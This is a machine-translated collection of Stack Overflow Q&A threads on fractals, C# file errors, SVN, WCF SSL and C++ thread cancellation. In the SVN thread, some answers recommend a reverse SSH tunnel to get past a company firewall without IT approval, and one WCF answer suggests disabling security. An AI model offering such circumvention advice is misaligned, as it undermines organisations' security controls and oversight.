然后你需要一个层来执行一个 L 系统。L-systems 与[Post-systems](http://en.wikipedia.org/wiki/Post_system)和[Semi-Thue 系统](http://en.wikipedia.org/wiki/Semi-Thue_system)有关，和 virii 一样，它们跨越了图灵完备性的边界。这个概念是*字符串重写*。它可以实现为宏扩展或具有额外控件以绑定递归的过程集。如果使用宏扩展（如下例所示），您仍然需要一个过程集来将符号映射到海龟命令，以及一个遍历字符串或数组的过程以运行编码的海龟程序。对于有界递归过程集（[例如](https://stackoverflow.com/questions/12381887/recursion-in-postscript)），您可以在过程中嵌入海龟命令，并为每个过程添加递归级别检查或将其分解到处理函数中。

这是使用宏扩展和一组非常简短的海龟命令的后记中毕达哥拉斯树的示例。有关 python 和 mathematica 的一些示例，请参阅我的[代码高尔夫挑战](https://codegolf.stackexchange.com/questions/9341/sorry-young-man-but-its-turtles-all-the-way-down)。

![ps l-system 毕达哥拉斯树 luser-droog](https://i.stack.imgur.com/ppO2V.png)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-01-08T21:28:59.930

有一本很棒的书叫[Chaos and Fractals](https://rads.stackoverflow.com/amzn/click/com/0387979034)，每章末尾都有简单的示例代码，用于实现一些分形或其他示例。很久以前，当我读那本书时，我将每个示例程序（用一些基本方言）转换成一个在网页上运行的 Java 小程序。小程序在这里：[http ://hewgill.com/chaos-and-fractals/](http://hewgill.com/chaos-and-fractals/)

其中一个示例是一个简单的 Mandelbrot 实现。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-08T22:12:28.953

另一个要学习的优秀分形是谢尔宾斯基三角形分形。

基本上，画一个三角形的三个角（等边是首选，但任何三角形都可以），然后在其中一个角处开始一个点 P。将 P 随机移动到 3 个角中的任何一个，并在那里画一个点。再次将 P 移动到任何随机角的一半，绘制并重复。

你会认为随机运动会产生随机结果，但事实并非如此。

参考：[http ://en.wikipedia.org/wiki/Sierpinski_triangle](http://en.wikipedia.org/wiki/Sierpinski_triangle)

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-08-07T09:11:49.363

谢尔宾斯基三角形和科赫曲线是火焰分形的特殊类型。火焰分形是一种非常通用的迭代函数系统，因为它使用非线性函数。

IFS:es 的算法如下：

`Start with a random point.`

重复以下多次（至少一百万，取决于最终图像大小）：

`Apply one of N predefined transformations (matrix transformations or similar) to the point. An example would be that multiply each coordinate with 0.5. Plot the new point on the screen.`

如果该点在屏幕外，则在屏幕内随机选择一个新点。

如果你想要漂亮的颜色，让颜色取决于最后使用的转换。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2009-01-08T21:58:46.440

我会从一些简单的东西开始，比如[Koch Snowflake](http://en.wikipedia.org/wiki/Koch_snowflake)。这是一个简单的过程，取一条线并对其进行转换，然后递归地重复该过程，直到它看起来整洁。

一些超级简单的事情，比如取 2 个点（一条线）并添加一个第 3 个点（制作一个角），然后在创建的每个新部分上重复。

```
fractal(p0, p1){
    Pmid = midpoint(p0,p1) + moved some distance perpendicular to p0 or p1;
    fractal(p0,Pmid);
    fractal(Pmid, p1);
} 
```

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2013-09-28T12:44:41.257

我认为您可能不会将分形视为一种算法或可以编程的东西。分形是一个概念！它是重复自身的详细模式的数学概念。

因此，您可以使用不同的方法以多种方式创建分形，如下图所示。

![在此处输入图像描述](https://i.stack.imgur.com/NteG7.jpg)

选择一种方法，然后研究如何实施它。这四个示例是使用[Marvin 框架](http://marvinproject.sourceforge.net/)实现的。源代码可[在此处获得](http://sourceforge.net/p/marvinproject/code/HEAD/tree/dev/trunk/MarvinPlugins/src/org/marvinproject/image/render/)

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-01-08T21:23:22.673

mandelbrot 集是通过重复评估一个函数直到它溢出（某个定义的限制），然后检查溢出需要多长时间来生成的。

伪代码：

```
MAX_COUNT = 64 // if we haven't escaped to infinity after 64 iterations, 
               // then we're inside the mandelbrot set!!!

foreach (x-pixel)
  foreach (y-pixel)
    calculate x,y as mathematical coordinates from your pixel coordinates
    value = (x, y)
    count = 0
    while value.absolutevalue < 1 billion and count < MAX_COUNT
        value = value * value + (x, y)
        count = count + 1

    // the following should really be one statement, but I split it for clarity
    if count == MAX_COUNT 
        pixel_at (x-pixel, y-pixel) = BLACK
    else 
        pixel_at (x-pixel, y-pixel) = colors[count] // some color map. 
```

笔记：

value 是一个复数。复数 (a+b *i) 的平方得到 (a* a-b*b+2*a *b* i)。您必须使用复杂类型，或者在循环中包含该计算。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2019-10-22T20:20:51.887

这是我使用纯 JavaScript 和 HTML 为 Mandelbrot 分形[编写的代码笔。](https://codepen.io/jdhenckel/pen/QWWpjGr)

希望代码很容易理解。

最复杂的部分是缩放和平移坐标系。制作彩虹调色板也很复杂。

```
function mandel(x,y) {
  var a=0; var b=0;
  for (i = 0; i<250; ++i) {
    // Complex z = z^2 + c
    var t = a*a - b*b;
    b = 2*a*b;
    a = t;
    a = a + x;
    b = b + y;
    var m = a*a + b*b;
    if (m > 10)  return i;
  }
  return 250;
} 
```

[![在此处输入图像描述](https://i.stack.imgur.com/iTVoI.png)](https://i.stack.imgur.com/iTVoI.png)

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-12-28T10:01:52.790

有时我编程分形是为了好玩和挑战。你可以在[这里](http://www.velardo.org/projects/index.html)找到它们。该代码是使用 P5.js 库以 Javascript 编写的，可以直接从 HTML 源代码中读取。

对于那些我见过的算法非常简单，只需找到核心元素，然后一遍又一遍地重复它。我用递归函数来做，但可以用不同的方法来做。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2012-09-29T20:01:59.740

上面的人正在使用寻找 sierpinski 和 Koch 的中点，我更建议复制形状，缩放它们，然后翻译它们以实现“分形”效果。sierpinski 的 Java 伪代码如下所示：

```
public ShapeObject transform(ShapeObject originalCurve)
    {
        Make a copy of the original curve
        Scale x and y to half of the original
        make a copy of the copied shape, and translate it to the right so it touches the first copied shape
        make a third shape that is a copy of the first copy, and translate it halfway between the first and second shape,and translate it up
        Group the 3 new shapes into one
        return the new shape
    } 
```

# c# - 如何确定是否因共享冲突而引发 IOException？

> ID：425956
> 
> 赞同：9
> 
> 时间：2009-01-08T21:07:51.270
> 
> 标签：c#, vb.net, .net-3.5

我有一个 C# 应用程序，我想将文件复制到新位置。有时我需要覆盖现有文件。发生这种情况时，我会收到 System.IO.IOException。我想从共享冲突中恢复，但是如何确定返回 IOException 是因为目标文件正在使用而不是其他原因？我可以查找“该进程无法访问该文件，因为它正在被另一个进程使用”。消息...但我不喜欢这个主意。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-08T23:24:25.267

这是我想出的解决方案。

```
private void RobustMoveFile( System.IO.DirectoryInfo destinationDirectory, System.IO.FileInfo sourceFile, Boolean retryMove )
                {
                    try
                    {
                        string DestinationFile = Path.Combine( destinationDirectory.FullName, sourceFile.Name );
                        if ( File.Exists( DestinationFile ) )
                            sourceFile.Replace( DestinationFile, DestinationFile + "Back", true );
                        else
                        {
                            sourceFile.CopyTo( DestinationFile, true );
                            sourceFile.Delete();
                        }
                    }
                    catch ( System.IO.IOException IOEx )
                    {
                        int HResult = System.Runtime.InteropServices.Marshal.GetHRForException( IOEx );        
                        const int SharingViolation = 32;
                        if ( ( HResult & 0xFFFF ) == SharingViolation && retryMove )
                            RobustMoveFile( destinationDirectory, sourceFile, false );
                        throw;
                    }
                } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-05T23:35:48.290

正如其他答案所述，您需要获取错误的 HResult 并进行检查。32 的 HResult 是共享冲突。

在**.NET 4.5**中，`IOException`具有公共`HResult`属性，因此您可以执行以下操作：

```
try
{
    // do file IO here
}
catch (IOException e)
{
    if (e.HResult == 32) // 32 = Sharing violation
    {
        // Recovery logic goes here
    }
    else
    {
        throw; // didn't need to catch this
    }
} 
```

但是，在**早期版本的 .NET**中，您需要`HResult`通过调用来获取[`Marshal.GetHRForException(Exception)`](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.gethrforexception(v=vs.80).aspx)，因此类似的代码将是：

```
try
{
    // do file IO here
}
catch (IOException e)
{
    int HResult = System.Runtime.InteropServices.Marshal.GetHRForException(e)
    if (HResult == 32) // 32 = Sharing violation
    {
        // Recovery logic goes here
    }
    else
    {
        throw; // Or do whatever else here
    }
} 
```

C# 6.0 允许您使用此语法仅捕获带有`when`子句的共享冲突：

```
try
{
    // do file IO here
}
catch (IOException e) when (e.HResult == 32) // 32 = Sharing violation
{
    // Recovery logic goes here
} 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2009-01-08T21:38:48.883

查找您可以处理的显式错误代码，例如：

catch (Exception u) { if (((SocketException)u).ErrorCode == 10035) ...

看看这里： http: [//msdn.microsoft.com/en-us/library/ms681391 (VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms681391(VS.85).aspx)

对于错误代码，例如：

ERROR_SHARING_VIOLATION - 32 - 0x20

ERROR_ACCESS_DENIED = 5 - 0x5

ERROR_FILE_NOT_FOUND - 2 - 0x2

# ruby - 如何在 netbeans 中调试单个 ruby 脚本？

> ID：425958
> 
> 赞同：1
> 
> 时间：2009-01-08T21:07:54.903
> 
> 标签：ruby, debugging, netbeans

所有这些都在 windows xp 盒子上：

Netbeans 设法接受了现有的 rails 项目并允许我对其进行很好的调试，但是我的项目有许多处理非 MVC 方面的处理脚本。rails 项目只是一个用于对执行这些脚本的请求进行排队的系统。

我尝试使用现有资源创建 netbeans 项目，但由于多种原因它失败了。

首先，由于我在一个地方有许多脚本，netbeans 抱怨我无法将源目录添加到项目中，因为它已经属于另一个项目。如果我将脚本放入它自己的空目录并尝试添加该目录，netbeans 会在尝试创建项目时停止，我必须从任务管理器中结束进程。

如果我为它创建一个新项目，删除默认的 main.rb 并将其替换为我要调试的脚本，调试会话将不会启动 - netbeans 抱怨它找不到程序入口点。

在我看来，如果我可以像 netbeans 允许的那样轻松调试 rails 应用程序，那么运行单个独立脚本将是微不足道的。我到底错过了什么？

更新：加载脚本并执行“调试/调试文件”是不可能的。该选项始终显示为灰色，即使对于 hello world 也是如此。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-09T01:23:29.507

右键单击项目，单击属性，选择运行，然后将主脚本更改为您的脚本。

您也可以通过打开文件来调试 Rails 项目中的单个文件，然后单击菜单工具栏中的调试，然后调试“file_name.rb”。或者只需在打开的文件上按 Ctrl-Shift-F5。

# c++ - Qt中的渲染方式数

> ID：425960
> 
> 赞同：2
> 
> 时间：2009-01-08T21:09:04.777
> 
> 标签：c++, qt, render

谁能告诉我在 Qt.Like Show() ， QDirectPainter 等中有多少种方法可以渲染屏幕...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-09T14:14:58.957

Qt 是双缓冲的。因此，您将使用 update() 来请求屏幕重绘。另一种观点是枚举 Qt 中的后端——这在不同的平台上有所不同。例如，对于 Windows，您可以使用光栅、OpenGL 或 Direct3D。在 Qt 4.5 中引入了一个新的图形系统，您可以在其中指定*所有*渲染都应使用 native、raster、opengl 之一完成。另请参阅[So Long 并感谢 Blit！](http://labs.trolltech.com/blogs/2008/10/22/so-long-and-thanks-for-the-blit/)

# git - 我可以在两个 SVN 存储库中拥有一个项目吗？

> ID：425975
> 
> 赞同：6
> 
> 时间：2009-01-08T21:13:25.110
> 
> 标签：git, svn

我们的 IT 部门不允许从实体办公室外部连接到 SVN 服务器。（他们就是这样。）当我不在办公室时，我需要处理项目。

我可以检查一下项目，然后等到我进来办理登机手续。也许那样最好。但我喜欢经常检查。我想知道是否有某种方法可以将一个项目保存在两个存储库中并使它们都保持最新状态。这样我总是可以在某个地方签到，以防我的 HD 死了。我在用于个人项目的 VPS 服务器上拥有自己的存储库。

我调查了`svn switch`命令。在两个存储库中的当前项目中，我尝试将我的工作副本从个人切换到工作 SVN 服务器......

```
$ svn switch --relocate svn+ssh://personalvps.com/svn/project/trunk svn://worksvn/project/trunk
svn: The repository at 'svn://worksvn/project/trunk' has uuid '2baef97e-42ce-488c-bbba-c2625158c643', but the WC has 'f13e1f32-dc92-4c4a-b84d-34a59fe32063' 
```

然后我尝试添加`--username`and`--password`参数，但收到错误消息“找不到条目”。

这甚至可能还是完全不切实际？

* * *

更新

感谢您的回答。不幸的是，任何涉及 IT 行动的解决方案（轻微的策略更改、更改某处的设置、安装某些东西）都不在桌面上。我必须在当前设置中找到一个解决方案，即除了我们的 Web 服务器之外没有来自外部的连接。

我将看看分布式版本控制。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T21:19:30.917

您可以将 SVN 与笔记本电脑上的另一个（本地）存储库一起使用。寻找流行的 git 或[SVK](http://svk.bestpractical.com/view/HomePage)。这些允许您首先提交到本地存储库，然后将所有提交同步到主 SVN 存储库。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T21:18:07.880

你读过[git](http://git-scm.com/)吗？它使用本地存储库进行离线工作，并且可以轻松地与 svn 存储库同步。

[两篇](http://www.aidanf.net/blog/2007/12/10/using-git-offline-commits-subversion-repository) [文章](http://fnd.lewcid.org/blog/archive/21)解释了如何做你想做的事。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-01-08T21:20:52.117

查看svnsync。我使用它将源伪造上的 SVN 存储库镜像到个人盒子，以便我可以使用 Trac。

[http://svn.apache.org/repos/asf/subversion/trunk/notes/svnsync.txt](http://svn.apache.org/repos/asf/subversion/trunk/notes/svnsync.txt)

它非常易于使用，您应该能够将您的办公室存储库设置为同步到个人存储库。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-08T21:49:00.703

作为最后的努力，你总是可以用 SSH 在你的公司防火墙上戳一个洞。研究“ssh 隧道”（而且，想想看，“在防火墙上戳一个洞”也可能是一个很好的搜索词）。我想你会想要 -L 或 -R ssh 选项，但我不记得哪个或者即使它们肯定是正确的。如果您正在运行 Windows，如果您先安装 Cygwin，仍然可以使用相同的技术。

**编辑**：对不起，我不太清楚这是如何工作的。你想要的选项是-R。它在远程机器上打开一个端口（用于监听）。当有东西连接到远程机器上的那个端口时，连接会沿着 SSH 连接返回到本地机器，然后转发到本地网络中您选择的服务器。您可以在晚上离开之前从您的工作计算机连接到您的家庭计算机，使用 SSH 打开隧道。然后，当您在家工作时，将 SVN 工作副本（使用`svn switch --relocate`）设置为指向您的家用计算机。顺便说一句，如果您正在运行 svnserve 守护进程，SVN 端口默认为 3690。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-08T21:18:33.930

单独用于 Subversion 是不实用的，但在分布式版本控制系统（如 git）中是实用的。

看看 git，更重要的是[git-svn](http://git-scm.com/docs/git-svn)。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-08T21:42:42.260

我强烈建议您的 IT 部门设置一个安全的 VPN，即使您在另一个 Internet 连接上，也可以将您置于他们的安全本地网络中。保持多个 repo 项目同步非常困难。

对于没有足够能力做正确事情的 IT 部门来说，作为一种解决方法，[Bazaar](http://bazaar-vcs.org/)看起来是最容易使用、最完整的解决方案。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-27T19:46:03.487

简短的回答：没有。您不能在存储库之间共享历史记录。

长答案：这是像 Subversion 这样的集中式系统的弱点。分布式版本控制解决方案（如 git）没有这个问题。每个“工作副本”都是一个存储库，提交可以离线进行，并在以后的存储库之间（或中央“官方”存储库）同步。

您需要某种方式在您的计算机上使用本地存储库进行本地工作，并在可能的情况下来回同步更改。碰巧你有几个选择：

*   [git](http://git-scm.com/)包括提供这种功能的[git-svn 。](http://git.or.cz/course/svn.html)git 有一个学习曲线，但在 1.6.x 系列中有所改进。

*   [svk](http://svk.bestpractical.com/view/HomePage) no longer seems to be very actively developed, but it does work reasonably well.It works *very much* like Subversion. It allows you to keep local mirrors of your official repositories, make commits to local branches on them and push those changes back to the official repository when you are able. It's not truly distributed in the same sense as git, but it's probably a better fit for your situation and less of a conceptual change than git.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-08T21:32:42.840

看看[*集市*](http://bazaar-vcs.org/)。它比*git*不那么令人生畏，并且有一个看起来很有用的 Subversion 存储库界面（通过[*bzr-svn*](http://bazaar-vcs.org/BzrForeignBranches/Subversion)）。

它将允许您从 Subversion 存储库中签出代码，独立开发（使用本地历史），并在需要时将您的代码签入 Subversion。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-08T22:08:11.397

就像 meador 说的那样，您可以在家中设置 SSH 隧道以通过办公室中的工作站隧道，并获得对办公室 SVN 的访问权限。

在 Windows 上设置 SSH 的一个很好的指南可以在这里找到：[Cygwin SSH for Windows](http://pigtail.net/LRP/printsrv/cygwin-sshd.html)

我这样做了一段时间以获得远程桌面访问，直到我能够设置一个适当的 SSH 服务器，并在防火墙上打开一个端口。

您所做的是从您的办公室工作站，与您的家用机器建立 SSH 连接，或者可选地使用专用的家用服务器。该初始连接的参数将提供一个 -R（远程）隧道，它实质上允许远程机器通过指定端口上的线路返回。

例如，如果您发出以下命令，则所有到达服务器上端口 1234 的流量都将转发到客户端上的端口 23。请参阅远程隧道。

[ssh2 -R 1234:: 来自SSH](http://www.ssh.com/support/documentation/online/ssh/adminguide-zos/55/Remote_Tunnels.html)的用户名@sshserver ^^

然后在家用机器上，您执行类似 svn://localhost:1234 的操作，这样您就可以访问办公室中的 SVN。

*注意：我不建议在不先与您的管理员交谈的情况下执行此操作，因为当您绕过他们的安全性时，他们会变得非常敏感……相信我，我知道。;-)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-08T22:31:25.670

我最近发表了一篇关于如何做类似事情的博客文章。我认为这对您有用，除非您需要从工作地点同步，除非您可以通过 ssh 进行隧道传输。

[http://justinsboringpage.blogspot.com/2008/11/how-to-copy-svn-repository-from.html](http://justinsboringpage.blogspot.com/2008/11/how-to-copy-svn-repository-from.html)

Subversion 有一个名为 SVNSYNC 的工具，可以轻松地从一个存储库同步到另一个存储库。这在移动到不同的基于 Web 的服务器时非常有用。在此示例中，我将我从事的项目从 Sourceforge 复制到 Google Code。完成后，谷歌代码存储库将成为一个精确的镜像，包括完整的更改历史记录。

您还需要将存储库的修订号设置为零。可以预见的是，谷歌代码通过在源页面上有一个按钮来为你做这件事，这很容易。

你需要有你的谷歌代码的用户名和密码才能做到这一点。对于您要复制的存储库，您不需要。首先，您使用初始命令为复制进行设置，然后使用同步命令进行实际复制。它一次做一个修订，需要一段时间......

svnsync init [https://lispbuilder.googlecode.com/svn](https://lispbuilder.googlecode.com/svn) [https://lispbuilder.svn.sourceforge.net/svnroot/lispbuilderProject](https://lispbuilder.svn.sourceforge.net/svnroot/lispbuilderProject) svnsync --username YOURNAME --password YOURPASSWORD sync [https://lispbuilder.googlecode.com/svn](https://lispbuilder.googlecode.com/svn) [https ://lispbuilder.svn.sourceforge.net/svnroot/lispbuilder](https://lispbuilder.svn.sourceforge.net/svnroot/lispbuilder)

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-01-08T22:45:15.817

在 svn 中，您绝对可以设置几个存储库，然后使用 svn:externals 命令将它们绑定在一起。我在家，所以我不记得完整的细节，但它类似于在 CVS 中使用模块。您创建一个文件夹并将其属性设置为一大堆外部（映射到其他存储库中的其他更高文件夹）。

丑陋的一点是，创建分支和最终版本很麻烦，因为具有属性的最终文件夹在存储库中没有得到很好的处理，但除了有点尴尬之外，它运行得很好。我们在一个存储库中拥有基本代码，另外两个具有特定于实例的配置。签出正确的标签，你就会得到一个完全合并的项目，准备好进行黑客攻击了。（它在 CVS 中确实工作得更好，但另一个有用的特性却及时丢失了）。

保罗。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-01-08T23:05:20.173

您需要一个 Subversion 复制系统，例如所述的[Pushmi](http://search.cpan.org/~clkao/Pushmi-v1.0.0/lib/Pushmi.pm)或 SVK。如果您可以通过您的网络服务器进行连接，为什么不使用 http 访问而不是 svn 来设置 SVN？如果端口被阻止，您可以使用 mod_proxy 将公共 url 重新连接到内部 svn 端口。

但是，如果您不得不与您的 IT 部门抗争，那么一切都已经出错了。你需要与他们接触，最好是正式的，让他们支持你完成工作所需的任何政策。如果您发现自己绕过了他们的系统，那么您要么会遇到麻烦（例如，您的公司可能有完全正当的理由说没有公司外部的源代码访问权限，并且执行您正在尝试的操作属于违纪行为）或者您的经理需要意识到 IT 不适合您。

# c# - 用 C# 编写轮询 FTP 下载的最佳方法

> ID：425977
> 
> 赞同：1
> 
> 时间：2009-01-08T21:13:54.643
> 
> 标签：c#, ftp

我目前有一个手动流程，我们将文本文件上传给业务合作伙伴，他们有一个自动化流程，可以读取文件，处理它，然后在 3-10 分钟（通常）之后的任何地方生成一个“结果”日志文件初始上传。我需要通过 .NET 应用程序自动化这个过程。我已经完成了上传，我没有下载结果。由于我不确切知道文件何时可以下载，我认为我必须经常轮询远程站点，获取结果目录中的文件列表，看看是否符合我的预期。
我做了一些阅读并找到了一些对 AsyncCallBack 的引用，但我不确定如何继续它。解决方案必须是我可以在没有 .net 之外的任何第三方库的情况下管理的东西，因为我对这个小项目的预算为 0。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-08T22:48:31.470

只需让一个线程（或您的主线程）休眠 x 毫秒，并在它不休眠时尝试进行下载。无需购买第 3 方 FTP 库，FTP 内置于 .NET（FtpWebRequest 和 FtpWebResponse）中。它们不是很好（非常简单），但可能会满足您的需求。

# wcf - 为我的 WCF 服务启用 SSL

> ID：425978
> 
> 赞同：39
> 
> 时间：2009-01-08T21:14:02.707
> 
> 标签：wcf, ssl

我有一个在开发中使用 basicHttpbinding 的 WCF 服务。

现在在我们要使用 SSL 的产品中，我必须进行哪些更改才能仅强制 SSL 连接？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2009-01-08T21:23:29.990

MSDN 上的此页面解释了 WCF 绑定安全性。

[http://msdn.microsoft.com/en-us/library/ms729700.aspx](http://msdn.microsoft.com/en-us/library/ms729700.aspx)

> BasicHttpBinding 类主要用于与现有的 Web 服务进行互操作，其中许多服务由 Internet 信息服务 (IIS) 托管。因此，此绑定的传输安全性设计用于与 IIS 站点的无缝互操作。这是通过将安全模式设置为传输然后设置客户端凭据类型来完成的。凭据类型值对应于 IIS 目录安全机制。以下代码显示正在设置的模式和设置为 Windows 的凭据类型。当客户端和服务器都在同一个 Windows 域上时，您可以使用此配置。
> 
> C＃
> 
> ```
> BasicHttpBinding b = new BasicHttpBinding();
> b.Security.Mode = BasicHttpSecurityMode.Transport ;
> b.Security.Transport.ClientCredentialType = HttpClientCredentialType.Windows; 
> ```
> 
> 或者，在配置中：
> 
> ```
> <bindings>   
>    <basicHttpBinding>
>             <binding name="SecurityByTransport">
>                <security mode="Transport">
>                  <transport clientCredentialType="Windows" />
>                 </security>
>             </binding>   
>    </basicHttpBinding> 
> </bindings> 
> ```

要启用 ssl，无需登录，请将 clientCredentialType 设置为“None”。

安全模式的选项有：

无、传输、消息、TransportWithMessageCredential 和 TransportCredentialOnly

您可以在以下位置找到更多详细信息：http: [//msdn.microsoft.com/en-us/library/system.servicemodel.basichttpsecuritymode.aspx](http://msdn.microsoft.com/en-us/library/system.servicemodel.basichttpsecuritymode.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T07:57:51.397

我刚遇到同样的问题，发现这篇 MSDN 文章： [如何：使用 SSL 配置 IIS 托管的 WCF 服务](http://msdn.microsoft.com/en-us/library/hh556232.aspx) 在文章的末尾，您将找到 WebConfig 文件的 xml 配置。

该解决方案对我来说效果很好。还有一件事要说，请记住，您需要一个 REAL 证书才能发布！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-03-24T18:36:21.627

我认为，如果在您拥有的*绑定*`<Security mode="Transport">`下，如果您将其更改为`<security mode="None">`，您会没事的。

*这是我正在处理的代码库*的副本，我在代码中尝试过，它似乎正在工作。
我至少在调用服务时会得到 WSDL，如果这有帮助的话。

```
BasicHttpBinding basicBinding = new BasicHttpBinding();
if (RegistryConnectionStringFactory.UseSslForCommunications)
{
   basicBinding.Security.Mode = BasicHttpSecurityMode.TransportWithMessageCredential;
   basicBinding.Security.Message.ClientCredentialType = BasicHttpMessageCredentialType.UserName;
}
else
{
   basicBinding.Security.Mode = BasicHttpSecurityMode.None;
   basicBinding.Security.Message.ClientCredentialType = BasicHttpMessageCredentialType.UserName;
} 
```

# c++ - 如何在取消工作线程中的操作时防止内存泄漏？

> ID：425987
> 
> 赞同：2
> 
> 时间：2009-01-08T21:15:20.770
> 
> 标签：c++, design-patterns, qt, memory-leaks, worker-thread

目前我正在开发一个包含数学分析的桌面应用程序。我正在使用 qt 作为 GUI 和用 C++ 编写的项目。当用户开始分析时，我打开一个工作线程并启动一个进度条。到目前为止一切正常，当用户取消操作时问题开始。操作很复杂，我使用了几个函数和对象，我在几个分配/释放内存次。我想了解在取消操作中恢复应该怎么做。因为可能存在内存泄漏。我应该使用哪种模式或方法来保证取消操作的稳健性和安全性？

我的想法是抛出异常，但是操作真的很复杂，所以我应该将 try-catch 放到我的所有函数中，还是有更通用的方式，模式..

编辑：问题是我的对象在作用域之间传输，所以 shared_ptr 或 auto_ptr 不能解决我的问题，Flag 想法可以，但我认为它需要这么多代码，应该有一个简单的方法。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T21:18:41.543

关闭工作线程的一种非常常见的方法是用一个标志标记它，并让工作线程定期检查这个标志。如果被标记，它应该停止其工作流程，清理并退出。

你的情况有这种可能吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T21:31:56.103

工作线程应检查是否有消息停止。消息可以通过标志或事件。当收到停止消息时，线程应该退出。

为所有分配的内存使用 BOOST 安全指针。退出时你不会有内存泄漏。曾经。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-10T02:36:14.030

## 确保您分配的内存是拥有的

确保每个分配的内存都由一个智能指针拥有，无论是 C++03 的 auto_ptr、C++11 的 unique_ptr 还是 Boost 的 scoped_ptr，甚至是[shared_ptr](http://www.boost.org/doc/libs/1_37_0/libs/smart_ptr/shared_ptr.htm)（可以共享、复制和移动）。

这样，RAII 将保护您免受任何内存泄漏。

## 使用[Boost.Thread 1.37](http://www.boost.org/doc/libs/1_37_0/doc/html/thread.html)

[礼貌地](http://www.ddj.com/architect/207100682)阅读中断，Herb Sutter 的一篇文章解释了中断线程的各种方法。

今天使用[Boost.Thread 1.37](http://www.boost.org/doc/libs/1_37_0/doc/html/thread.html)，您可以通过抛出异常来要求线程终止。[在 Boost 中，是 boost::thread_interrupted 异常，它会从任何中断点](http://www.boost.org/doc/libs/1_37_0/doc/html/thread/thread_management.html#interruption_points)抛出异常。

因此，您不需要处理某种消息循环，或验证某些全局/共享数据。主线程通过异常请求工作线程停止，一旦工作线程到达中断点，就会抛出异常。前面描述的 RAII 机制将确保您分配的所有数据都将被正确释放。

假设您有一些将在线程中调用的伪代码。它可能是一个可能会分配内存的函数，另一个会在循环内进行大量计算：

```
Object * allocateSomeObject()
{
   Object * o = NULL ;

   if(/*something*/)
   {
      // Etc.
      o = new Object() ;
      // Etc.
   }

   return o ; // o can be NULL
}

void doSomethingLengthy()
{
   for(int i = 0; i < 1000; ++i)
   {
      // Etc.
      for(int j = 0; j < 1000; ++j)
      {
         // Etc.
         // transfert of ownership
         Object * o = allocateSomeObject() ;
         // Etc.
         delete o ;
      }
      // Etc.
   }
} 
```

上面的代码不安全，如果不采取措施确保内存始终由 C++ 对象（通常是智能指针）拥有，则无论中断模式如何都会泄漏。

可以通过这种方式对其进行修改，以使代码既可中断又内存安全：

```
boost::shared_ptr<Object> allocateSomeObject()
{
   boost::shared_ptr<Object> o ;

   if(/*something*/)
   {
      // Etc.
      boost::this_thread::interruption_point() ;
      // Etc.
      o = new Object() ;
      // Etc.
      boost::this_thread::interruption_point() ;
      // Etc.
   }

   return o ; // o can be "NULL"
}

void doSomethingLengthy()
{
   for(int i = 0; i < 1000; ++i)
   {
      // Etc.
      for(int j = 0; j < 1000; ++j)
      {
         // Etc.
         // transfert of ownership
         boost::shared_ptr<Object> o = allocateSomeObject() ;
         // Etc.
         boost::this_thread::interruption_point() ;
         // Etc.
      }

      // Etc.
      boost::this_thread::interruption_point() ;
      // Etc.
   }
}

void mainThread(boost::thread & worker_thread)
{
   // etc.
   if(/* some condition */)
   {
      worker_thread.interrupt() ;
   }
} 
```

## 不使用升压？

如果你不使用 Boost，那么你可以模拟这个。如果线程应该被中断，则将一些线程存储布尔变量设置为“true”。添加检查此变量的函数，如果为真，则抛出特定异常。让线程的“根”捕获此异常以使其正确结束。

## 免责声明

我现在无法访问 Boost 1.37，所以我无法测试之前的代码，但想法就在那里。我会尽快对此进行测试，并最终发布更完整/正确/可编译的代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T21:27:15.957

您应该尝试将动态分配的资源保存在自动（位于堆栈上的本地）哨兵对象中，当这些资源超出范围时，它们会在其析构函数中释放这些资源。这样您就可以知道它们不会泄漏，即使函数由于异常而退出。您可能还想研究用于在例程之间共享内存的 boost 库 shared_ptr。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T21:32:03.123

首先，抛出异常多线程应用程序是不确定的，因为没有标准的方法来处理它们（它们是否传播到其他线程？调度程序？main（）？其他地方？）。至少在你得到一个内置标准化线程的 C++0x 库之前。

目前使用 RAII 更有意义（这将保证在范围退出时清理所有资源（包括内存），无论它是由于成功还是失败而存在）并返回某种状态代码对于最有意义的线程（例如调度程序）。

此外，十多年来一直不鼓励直接取消线程。正如 Simon Jensen 建议的那样，告诉线程停止自己并让线程处理清理工作要好得多。

* * *

## 回答 #6

> 赞同：0
> 
